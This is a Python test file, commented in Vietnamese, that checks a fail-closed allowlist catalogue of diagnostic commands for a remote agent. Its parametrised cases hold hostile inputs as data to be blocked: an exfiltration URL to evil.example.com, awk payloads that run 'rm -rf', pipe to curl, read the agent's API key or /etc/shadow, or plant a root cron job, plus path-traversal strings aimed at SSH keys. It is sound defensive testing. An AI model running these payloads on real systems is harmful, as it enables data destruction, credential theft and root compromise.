"""Catalogue lệnh chẩn đoán — test hàng rào, không test nội dung từng entry.

Bài test ở đây bảo vệ ba thứ: (1) catalogue THẬT trong repo load được và phủ đủ
domain — nếu ai đó thêm entry sai, CI đỏ chứ không phải pod đỏ lúc khởi động;
(2) hàng rào fail-closed thật sự chặn, không chỉ tồn tại; (3) merge từ
`OMNI_DIAG_COMMAND_CATALOG` chỉ SIẾT được.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from pkg.diagnostics.command_catalog import (
    is_local_target,
    CatalogError,
    CommandSpec,
    is_path_readable,
    load_catalog,
)
from pkg.domain.taxonomy import CANONICAL_DOMAINS

_REAL_CATALOG = Path(__file__).resolve().parents[1] / "config" / "diagnostic_commands.yaml"


def _write(tmp_path: Path, name: str, entries: list[dict]) -> Path:
    p = tmp_path / name
    p.write_text(json.dumps({"commands": entries}), encoding="utf-8")
    return p


# --------------------------------------------------------------------------- (a)
def test_real_catalog_loads() -> None:
    cat = load_catalog(paths=[_REAL_CATALOG])
    assert len(cat.commands()) > 50
    assert "kubectl" in cat.commands()


def test_real_catalog_is_the_default() -> None:
    """Load không tham số phải dùng đúng file trong repo, không phải file khác."""
    cat = load_catalog(env={})
    assert str(_REAL_CATALOG) in cat.source_files


# --------------------------------------------------------------------------- (b)
@pytest.mark.parametrize("domain", CANONICAL_DOMAINS)
def test_every_canonical_domain_has_at_least_one_command(domain: str) -> None:
    """Domain không có lệnh nào = Omni mù hoàn toàn ở domain đó."""
    cat = load_catalog(paths=[_REAL_CATALOG])
    assert cat.by_domain(domain), f"domain {domain} khong co lenh chan doan nao"


def test_real_catalog_has_no_write_verb_anywhere() -> None:
    """Hàng rào chạy lúc load; test này khẳng định nó đã chạy trên file thật."""
    cat = load_catalog(paths=[_REAL_CATALOG])
    for spec in cat.specs.values():
        assert not (spec.subcommands & {"apply", "delete", "restart", "start", "stop"})


# --------------------------------------------------------------------------- (c)
@pytest.mark.parametrize(
    ("cmd", "sub"),
    [("systemctl", "restart"), ("kubectl", "apply"), ("redis-cli", "flushall"), ("docker", "exec")],
)
def test_write_subcommand_is_rejected_at_load(tmp_path: Path, cmd: str, sub: str) -> None:
    f = _write(tmp_path, "bad.json", [{"command": cmd, "domain": "service", "subcommands": ["status", sub]}])
    with pytest.raises(CatalogError, match="GHI"):
        load_catalog(paths=[f])


def test_deny_subcommands_may_contain_write_verbs(tmp_path: Path) -> None:
    """deny_* CHỨA động từ ghi là đúng mục đích — không được coi là vi phạm."""
    f = _write(
        tmp_path,
        "ok.json",
        [{"command": "systemctl", "domain": "service", "subcommands": ["status"], "deny_subcommands": ["restart"]}],
    )
    spec = load_catalog(paths=[f]).get("systemctl")
    assert spec is not None
    assert spec.allows_subcommand("restart")[0] is False


# --------------------------------------------------------------------------- (d)
@pytest.mark.parametrize("bad", ["/var/lib/mysql", "/home/khach", "/root", "/var/backups"])
def test_read_allow_cannot_reach_hard_denied_paths(tmp_path: Path, bad: str) -> None:
    f = _write(
        tmp_path,
        "bad.json",
        [{"command": "cat", "domain": "application", "reads_content": True, "read_allow": ["/var/log", bad]}],
    )
    with pytest.raises(CatalogError, match="chan cung"):
        load_catalog(paths=[f])


# --------------------------------------------------------------------------- (e)
def _cat_spec() -> CommandSpec:
    spec = load_catalog(paths=[_REAL_CATALOG]).get("cat")
    assert spec is not None
    return spec


@pytest.mark.parametrize(
    "path",
    [
        "/var/log/../../root/.ssh/id_rsa",  # traversal ra khỏi phạm vi
        "/var/log/../lib/mysql/ibdata1",
        "/etc/../home/khach/data.csv",
    ],
)
def test_path_traversal_is_blocked(path: str) -> None:
    ok, reason = is_path_readable(path, _cat_spec())
    assert ok is False
    assert reason  # phải nói rõ vì sao, để vào CRAT


@pytest.mark.parametrize(
    "path",
    ["/etc/app/.env", "/var/log/app/.env", "/etc/shadow", "/etc/app/.my.cnf", "/etc/x/id_rsa", "/etc/.git/config"],
)
def test_secret_like_paths_blocked_even_inside_scope(path: str) -> None:
    ok, reason = is_path_readable(path, _cat_spec())
    assert ok is False, f"{path} phai bi chan"
    assert "secret_like_path" in reason


@pytest.mark.parametrize("path", [
    "/etc/ssl/private/server.key",   # đuôi .key — mẫu neo (^|/) cũ bỏ lọt hoàn toàn
    "/etc/pki/tls/cert.pem",
    "/etc/ssh/ssh_host_rsa_key",     # OpenSSH: KHÔNG có đuôi, chỉ hậu tố _key
    "/etc/kubernetes/pki/ca.crt",    # cả cây pki
    "/opt/app/keystore.jks",
])
def test_secret_by_extension_blocked(path: str) -> None:
    """Khoá riêng phải bị chặn kể cả khi nằm trong phạm vi đọc cho phép.

    Mẫu cũ neo `(^|/)` nên `\\.key`/`\\.pem` chỉ khớp file TÊN LÀ `.key` —
    `/etc/ssl/private/server.key` đọc được bình thường qua `cat` vì `read_allow` có
    `/etc`. Khoá TLS là thứ đắt nhất trên một host: mất nó là mất luôn mọi phiên đã
    bị ghi lại. Đuôi file cần neo `$`, còn OpenSSH lại đặt tên không đuôi (`_key`) —
    hai họ mẫu, hai cách neo.
    """
    ok, reason = is_path_readable(path, _cat_spec())
    assert ok is False, f"{path} phai bi chan"
    assert "secret_like_path" in reason


def test_ssh_config_still_readable_not_over_blocked() -> None:
    """Chặn quá rộng cũng là hỏng: `sshd_config` có giá trị chẩn đoán thật.

    Chặn cả `/etc/ssh` thì mất năng lực mà không bảo vệ thêm gì — khoá riêng ở đó tên
    `ssh_host_*_key`, đã bị bắt qua hậu tố. Chặn thừa đẩy người vận hành đi tìm đường lách.
    """
    assert is_path_readable("/etc/ssh/sshd_config", _cat_spec())[0] is True


@pytest.mark.parametrize("path", ["/proc/meminfo", "/etc/nginx/nginx.conf", "/var/log/nginx/error.log"])
def test_operational_paths_readable(path: str) -> None:
    """Nới có chủ đích: không đọc được các đường này thì không chẩn đoán được tầng app."""
    assert is_path_readable(path, _cat_spec())[0] is True


def test_tail_scope_is_narrower_than_cat() -> None:
    """tail chỉ dùng cho log — /etc không thuộc phạm vi của nó."""
    tail = load_catalog(paths=[_REAL_CATALOG]).get("tail")
    assert tail is not None
    assert is_path_readable("/var/log/app.log", tail)[0] is True
    assert is_path_readable("/etc/nginx/nginx.conf", tail)[0] is False


# --------------------------------------------------------------------------- (f)
def test_env_overlay_can_only_tighten(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    base = _write(
        tmp_path,
        "base.json",
        [{"command": "systemctl", "domain": "service", "subcommands": ["status", "show"],
          "deny_subcommands": ["restart"], "deny_flags": ["--now"]}],
    )
    overlay = _write(
        tmp_path,
        "overlay.json",
        [{"command": "systemctl", "domain": "service", "subcommands": ["status"],
          "deny_subcommands": ["show"], "deny_flags": ["--host"]}],
    )
    cat = load_catalog(paths=[base], env={"OMNI_DIAG_COMMAND_CATALOG": str(overlay)})
    spec = cat.get("systemctl")
    assert spec is not None
    # deny hợp lại — overlay KHÔNG bỏ được deny đã có ở base
    assert {"restart", "show"} <= spec.deny_subcommands
    assert {"--now", "--host"} <= spec.deny_flags
    # subcommand bị overlay deny thì không còn dùng được, dù base cho phép
    assert spec.allows_subcommand("show")[0] is False
    assert spec.allows_subcommand("status")[0] is True


def test_env_overlay_cannot_relax_hard_read_deny(tmp_path: Path) -> None:
    overlay = _write(
        tmp_path,
        "overlay.json",
        [{"command": "cat", "domain": "application", "reads_content": True, "read_allow": ["/home"]}],
    )
    with pytest.raises(CatalogError, match="chan cung"):
        load_catalog(paths=[_REAL_CATALOG], env={"OMNI_DIAG_COMMAND_CATALOG": str(overlay)})


def test_unknown_domain_is_rejected(tmp_path: Path) -> None:
    f = _write(tmp_path, "bad.json", [{"command": "foo", "domain": "quantum"}])
    with pytest.raises(CatalogError, match="domain"):
        load_catalog(paths=[f])


def test_command_must_be_basename_not_path(tmp_path: Path) -> None:
    """`/tmp/x/ps` là cách cổ điển để lén một binary lạ vào chỗ tên tin cậy."""
    f = _write(tmp_path, "bad.json", [{"command": "/tmp/x/ps", "domain": "os_host"}])
    with pytest.raises(CatalogError, match="ten lenh"):
        load_catalog(paths=[f])


def test_empty_catalog_fails_closed(tmp_path: Path) -> None:
    f = _write(tmp_path, "empty.json", [])
    with pytest.raises(CatalogError, match="rong"):
        load_catalog(paths=[f])


# ---------------------------------------------------------------------------
# Đích mạng — lỗ hổng egress mà agent rewire đã nêu, vá bằng local_targets_only
# ---------------------------------------------------------------------------

def test_curl_declares_local_targets_only() -> None:
    """`curl` phải khai `local_targets_only`, không chỉ chặn cờ.

    `deny_flags` bịt được ghi file (`-o`) và gửi body (`-d`), nhưng KHÔNG có cờ nào
    của curl ngăn trỏ tới một host Internet. Một GET kèm query string đã là kênh đẩy
    dữ liệu ra, và cũng là đường quét dịch vụ nội bộ từ trong mạng khách.
    """
    curl = load_catalog(paths=[_REAL_CATALOG]).get("curl")
    assert curl is not None
    assert curl.local_targets_only is True


@pytest.mark.parametrize("target", [
    "http://127.0.0.1:8080/healthz", "http://localhost/health",
    "http://10.0.0.5:9000/metrics", "http://192.168.1.10/", "http://[::1]:80/",
    "myhost",  # tên máy không có dấu chấm — nội bộ
])
def test_local_targets_allowed(target: str) -> None:
    assert is_local_target(target)[0] is True, target


@pytest.mark.parametrize("target,why", [
    ("https://evil.example.com/exfil?d=secret", "remote_host_not_allowed"),
    ("http://8.8.8.8/", "public_ip_not_allowed"),
    ("file:///etc/passwd", "scheme_not_allowed"),
    ("gopher://x.com/", "scheme_not_allowed"),
])
def test_remote_targets_blocked(target: str, why: str) -> None:
    ok, reason = is_local_target(target)
    assert ok is False, target
    assert why in reason


def test_hostname_is_not_resolved_dns_rebinding() -> None:
    """Tên miền có dấu chấm bị từ chối thẳng, KHÔNG resolve rồi tin kết quả.

    Resolve rồi kiểm IP là mở cửa cho DNS rebinding: bản ghi trả IP riêng lúc kiểm
    rồi trả IP công lúc gọi thật. Một tên miền trỏ vào 127.0.0.1 vẫn bị chặn — mất
    một trường hợp dùng hợp lệ, nhưng đây là chỗ nên bảo thủ.
    """
    assert is_local_target("localhost.attacker.com")[0] is False


# ---------------------------------------------------------------------------
# Cờ câu lệnh DB không được đem áp cho lệnh KHÔNG phải DB
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd,args", [
    ("grep", ["-c", "ERROR", "/var/log/syslog"]),      # -c = đếm, không phải --command
    ("grep", ["-e", "ERROR", "/var/log/syslog"]),      # -e = mẫu
    ("ps", ["-e", "-o", "pid,comm"]),                  # -e = mọi tiến trình
    ("journalctl", ["-e", "-u", "nginx"]),             # -e = nhảy cuối
    ("tail", ["-c", "4096", "/var/log/syslog"]),       # -c = số byte
    ("du", ["-c", "-h", "/var/log"]),                  # -c = in tổng
    ("wc", ["-c", "/var/log/syslog"]),
    ("sar", ["-e", "10:00:00"]),                       # -e = giờ kết thúc
])
def test_statement_flags_not_applied_to_non_db_commands(cmd: str, args: list[str]) -> None:
    """`-c`/`-e` chỉ là cờ câu lệnh với client DB, không phải với mọi lệnh.

    Bóc câu lệnh cho MỌI lệnh khiến token sau cờ bị chấm như một câu SQL; lệnh không
    có `statement_verbs` thì mọi giá trị đều trượt. Đo thực tế lúc phát hiện: **9/10**
    cách gọi đời thực bị chặn oan, trong đó có `grep -c ERROR` — một trong những lệnh
    chẩn đoán hay dùng nhất. Kiểu hỏng này không lộ ra ở test tổng hợp vì lệnh vẫn
    "có trong catalogue"; nó chỉ lộ khi gọi đúng cách người ta thật sự gọi.
    """
    from pkg.diagnostics.validator import validate_command

    ok, reason = validate_command(cmd, args)
    assert ok is True, f"{cmd} {' '.join(args)} bi chan oan: {reason}"


@pytest.mark.parametrize("cmd,args,why", [
    ("psql", ["-c", "SELECT * FROM customers"], "select_outside_system_schema"),
    ("psql", ["-c", "DROP TABLE t"], "statement_verb_not_allowed"),
    ("mysql", ["-e", "SELECT * FROM orders"], "select_outside_system_schema"),
    ("mysql", ["-e", "SHOW STATUS; DROP TABLE t"], "statement_multiple_not_allowed"),
    ("redis-cli", ["GET", "session:abc"], "statement_verb_not_allowed"),
])
def test_db_statements_still_strict_after_scoping_fix(cmd: str, args: list[str], why: str) -> None:
    """Sửa chỗ trên KHÔNG được làm lỏng đường DB — đó mới là chỗ có dữ liệu khách."""
    from pkg.diagnostics.validator import validate_command

    ok, reason = validate_command(cmd, args)
    assert ok is False, f"{cmd} {' '.join(args)} phai bi chan"
    assert why in reason


# ---------------------------------------------------------------------------
# awk: chạy được, chỉ chặn khi THẬT SỰ ghi/chạy lệnh khác
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("script,files", [
    ("{print $1}", ["/var/log/syslog"]),
    ("NR>1{sum+=$3} END{print sum}", ["/var/log/syslog"]),
    ('/ERROR/{c++} END{printf "%d\\n", c}', ["/var/log/syslog"]),   # pattern có dấu /
    ("{if ($5 > 100) print $0}", ["/var/log/syslog"]),              # `>` là so sánh
])
def test_awk_normal_scripts_run(script: str, files: list[str]) -> None:
    """Cú pháp awk bình thường phải CHẠY.

    `$` nằm trong regex metachar nên quét cả dòng làm mọi chương trình awk đời thực
    chết — awk có trong catalogue nhưng không bao giờ chạy được. Và pattern awk dùng
    `/` làm dấu phân cách (`/ERROR/{...}`) nên bộ kiểm đường dẫn tưởng script là path
    rồi từ chối với lý do `path_out_of_scope` — vô nghĩa với người đọc log.
    """
    from pkg.diagnostics.validator import validate_command

    ok, reason = validate_command("awk", [script, *files])
    assert ok is True, f"awk {script!r} bi chan oan: {reason}"


@pytest.mark.parametrize("script,why", [
    ('BEGIN{system("rm -rf /data")}', "awk_system_call_blocked"),
    ('{print > "/tmp/out"}', "awk_file_write_blocked"),
    ('{print >> "/var/log/x"}', "awk_file_write_blocked"),
    ('{print | "curl http://evil/x"}', "awk_pipe_to_command_blocked"),
    ('BEGIN{print ENVIRON["OMNI_AGENT_API_KEY"]}', "awk_environ_read_blocked"),
    ('BEGIN{while((getline l < "/etc/shadow")>0) print l}', "awk_getline_"),
    # RCE quyền root 2026-07-31: đích redirect/getline là BIẾN, không có dấu nháy sát
    # toán tử ⇒ guard cũ (đòi nháy) lọt hết. 3 PoC đã chạy thật vượt validate_command.
    ('BEGIN{f="/etc/cron.d/pwn"; print "* * * * * root id" > f}', "awk_file_write_blocked"),
    ('BEGIN{c="id"; c | getline out; print out}', "awk_getline_blocked"),
    ('BEGIN{p="/etc/shadow"; getline l < p; print l}', "awk_getline_blocked"),
])
def test_awk_only_writes_and_escapes_are_blocked(script: str, why: str) -> None:
    """Bốn cửa duy nhất awk tác động ra ngoài tiến trình của nó, cộng đọc env.

    Chủ hệ thống yêu cầu awk được chạy, chỉ cấm khi THẬT SỰ sửa đổi dữ liệu khách.
    Nên không liệt kê trắng cú pháp (awk là ngôn ngữ đầy đủ, bất khả thi) mà chặn
    đúng các cửa: `system()`, pipe tới lệnh ngoài, ghi file, và `getline <` đọc file
    ngoài phạm vi. `ENVIRON[]` chặn thêm vì nó đọc khoá API của chính agent.
    """
    from pkg.diagnostics.validator import validate_command

    ok, reason = validate_command("awk", [script, "/var/log/syslog"])
    assert ok is False, f"{script!r} phai bi chan"
    assert why in reason


def test_awk_data_files_still_scope_checked() -> None:
    """Miễn quét cho SCRIPT không được làm lỏng kiểm FILE DỮ LIỆU."""
    from pkg.diagnostics.validator import validate_command

    for path in ("/var/lib/mysql/ibdata1", "/home/khach/orders.csv"):
        ok, reason = validate_command("awk", ["{print $1}", path])
        assert ok is False, path
        assert "hard_denied_path" in reason


# ── Layout bundle trên host khách (hồi quy 2026-07-30) ───────────────────────


class TestDefaultCatalogAcrossLayouts:
    """Catalogue mặc định phải tìm được ở CẢ layout repo và layout bundle.

    Bug thật: `_DEFAULT_CATALOG` từng là hằng `parents[3] / "config" / "...yaml"`.
    Đúng trong repo (`src/pkg/diagnostics/`), nhưng bundle không có tầng `src/` nên
    trên VM nó tính ra `/opt/config/diagnostic_commands.yaml` — không tồn tại. Hệ quả:
    `load_catalog()` ném `CatalogError` ⇒ fail-closed ⇒ agent từ chối MỌI lệnh chẩn
    đoán trên cả 3 VM. Và bundle chỉ mang bản `.json` (không có PyYAML trên host
    khách), nên chỉ thử tên `.yaml` cũng không đủ.
    """

    def test_candidates_cover_repo_and_bundle_layout(self) -> None:
        from pkg.diagnostics.command_catalog import _default_catalog_candidates

        cands = _default_catalog_candidates()
        suffixes = {c.suffix for c in cands}
        assert suffixes == {".yaml", ".json"}, "phai thu ca YAML va JSON"

        # Hai gốc khác nhau: một cho repo (có src/), một cho bundle (không có).
        roots = {c.parent.parent for c in cands}
        assert len(roots) == 2, f"phai co 2 goc, thay: {sorted(map(str, roots))}"

    def test_repo_layout_resolves_to_real_file(self) -> None:
        from pkg.diagnostics.command_catalog import _resolve_default_catalog

        got = _resolve_default_catalog()
        assert got is not None and got.exists()

    def test_bundle_layout_with_json_only(self, tmp_path, monkeypatch) -> None:
        """Dựng lại đúng layout bundle: pkg/diagnostics/ + config/*.json, KHÔNG có src/."""
        import json

        from pkg.diagnostics import command_catalog as cc

        install = tmp_path / "opt" / "omni-remote-agent"
        (install / "pkg" / "diagnostics").mkdir(parents=True)
        (install / "config").mkdir()
        fake_module = install / "pkg" / "diagnostics" / "command_catalog.py"
        fake_module.write_text("# stand-in\n", encoding="utf-8")

        entries = [{
            "command": "uptime",
            "domain": "os_host",
            "description": "tai he thong",
        }]
        (install / "config" / "diagnostic_commands.json").write_text(
            json.dumps({"commands": entries}), encoding="utf-8"
        )

        monkeypatch.setattr(cc, "__file__", str(fake_module))
        cands = cc._default_catalog_candidates()
        resolved = cc._resolve_default_catalog()

        assert resolved is not None, (
            f"khong resolve duoc trong layout bundle; da thu: {[str(c) for c in cands]}"
        )
        assert resolved.suffix == ".json"
        assert resolved.parent.parent == install

    def test_error_message_lists_every_candidate(self, tmp_path, monkeypatch) -> None:
        """Không tìm thấy thì thông báo phải nói ĐÃ THỬ Ở ĐÂU.

        Bản cũ chỉ in một đường dẫn, nên trên VM nó báo `/opt/config/...yaml` —
        người đọc tưởng cấu hình sai chỗ đó, chứ không đoán được là giả định độ sâu
        thư mục bị lệch.
        """
        from pkg.diagnostics.command_catalog import CatalogError
        from pkg.diagnostics import command_catalog as cc

        empty = tmp_path / "nowhere" / "pkg" / "diagnostics" / "command_catalog.py"
        empty.parent.mkdir(parents=True)
        empty.write_text("# stand-in\n", encoding="utf-8")
        monkeypatch.setattr(cc, "__file__", str(empty))

        with pytest.raises(CatalogError) as exc:
            cc.load_catalog(env={})
        msg = str(exc.value)
        assert "da thu" in msg
        assert msg.count("diagnostic_commands") >= 2
